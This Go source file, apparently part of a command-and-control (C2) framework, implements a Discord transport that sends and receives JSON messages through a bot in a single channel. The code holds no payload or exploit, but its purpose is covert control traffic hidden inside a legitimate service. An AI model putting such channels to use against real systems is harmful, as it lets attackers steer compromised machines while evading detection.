package c2

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

type DiscordLayer struct {
	botID     string
	token     string
	channelID string
	session   *discordgo.Session
	mu        sync.Mutex
	connected bool
	recvCh    chan *Message
}

func NewDiscordLayer(botID, token, channelID string) *DiscordLayer {
	return &DiscordLayer{
		botID:     botID,
		token:     token,
		channelID: channelID,
		recvCh:    make(chan *Message, 64),
	}
}

func (d *DiscordLayer) Name() string { return "discord" }

func (d *DiscordLayer) Connect() error {
	d.mu.Lock()
	defer d.mu.Unlock()

	sess, err := discordgo.New("Bot " + d.token)
	if err != nil {
		return fmt.Errorf("discord new: %w", err)
	}

	sess.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		if m.ChannelID != d.channelID {
			return
		}
		if m.Author.ID == s.State.User.ID {
			return
		}

		var msg Message
		if err := json.Unmarshal([]byte(m.Content), &msg); err != nil {
			return
		}
		select {
		case d.recvCh <- &msg:
		default:
		}
	})

	intents := discordgo.IntentGuildMessages | discordgo.IntentMessageContent
	sess.Identify.Intents = intents

	if err := sess.Open(); err != nil {
		return fmt.Errorf("discord open: %w", err)
	}

	d.session = sess
	d.connected = true
	return nil
}

func (d *DiscordLayer) Send(msg *Message) error {
	d.mu.Lock()
	defer d.mu.Unlock()
	if !d.connected || d.session == nil {
		return fmt.Errorf("discord not connected")
	}

	data, _ := json.Marshal(msg)
	_, err := d.session.ChannelMessageSend(d.channelID, string(data))
	if err != nil {
		d.connected = false
		return err
	}
	return nil
}

func (d *DiscordLayer) Receive() (*Message, error) {
	select {
	case msg := <-d.recvCh:
		return msg, nil
	case <-time.After(30 * time.Second):
		return nil, fmt.Errorf("timeout")
	}
}

func (d *DiscordLayer) Close() error {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.connected = false
	if d.session != nil {
		return d.session.Close()
	}
	return nil
}

func (d *DiscordLayer) IsConnected() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.connected
}
